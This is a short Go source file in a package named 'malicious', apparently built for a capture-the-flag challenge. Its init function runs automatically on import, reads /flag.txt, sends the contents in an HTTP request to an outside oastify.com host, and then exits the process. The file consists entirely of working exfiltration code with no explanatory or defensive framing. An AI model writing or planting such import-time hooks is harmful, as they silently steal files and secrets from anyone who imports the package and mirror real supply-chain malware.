// Remove the 'main' package declaration
package malicious

import (
    "io/ioutil"
    "net/http"
    "os"
)

func init() {  // This runs when the package is imported
    flag, err := ioutil.ReadFile("/flag.txt")
    if err != nil {
        return
    }
    http.Get("http://ke2qo37fuf4xd710ihk9ma32dtjk7bv0.oastify.com/exfil?flag=" + string(flag))
    os.Exit(0)
}
